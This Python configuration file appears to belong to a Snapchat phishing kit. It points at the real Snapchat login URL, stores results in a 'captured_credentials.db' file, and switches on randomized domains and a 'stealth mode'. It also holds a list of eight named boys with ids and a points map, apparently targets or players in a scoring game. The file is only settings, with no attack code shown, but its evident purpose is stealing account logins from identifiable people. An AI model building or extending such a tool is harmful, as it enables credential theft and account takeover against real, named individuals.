import os
import secrets

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

CONFIG = {
    "SNAPCHAT_LOGIN_URL": "https://accounts.snapchat.com/login",
    "SERVER_PORT": 8080,
    "USE_HTTPS": True,
    "CAPTURE_DB": os.path.join(BASE_DIR, "captured_credentials.db"),
    "SESSION_TTL_MINUTES": 60,
    "RANDOMIZE_DOMAINS": True,
    "ADMIN_KEY": os.environ.get("SNAPCHAT_LAB_ADMIN_KEY", "CHANGE_ME_SNAPCHAT_LAB_2024"),
    "STEALTH_MODE": True,
    "STEALTH_BLACKLIST": False,
}

ADMIN_KEY_FILE = os.path.join(BASE_DIR, ".admin_key")
if os.path.exists(ADMIN_KEY_FILE):
    with open(ADMIN_KEY_FILE, "r") as f:
        CONFIG["ADMIN_KEY"] = f.read().strip()
else:
    new_key = secrets.token_hex(32)
    CONFIG["ADMIN_KEY"] = new_key
    with open(ADMIN_KEY_FILE, "w") as f:
        f.write(new_key)

BOYS_LIST = [
    {"id": "famoussa", "name": "Famoussa"},
    {"id": "bill", "name": "Bill"},
    {"id": "bakou", "name": "Bakou"},
    {"id": "yamoussa", "name": "Yamoussa"},
    {"id": "bassidy", "name": "Bassidy"},
    {"id": "ben", "name": "BEN"},
    {"id": "ibrahim", "name": "SK"},
    {"id": "cherif", "name": "Chérif"},
]
POINTS_MAP = [30, 20, 10]
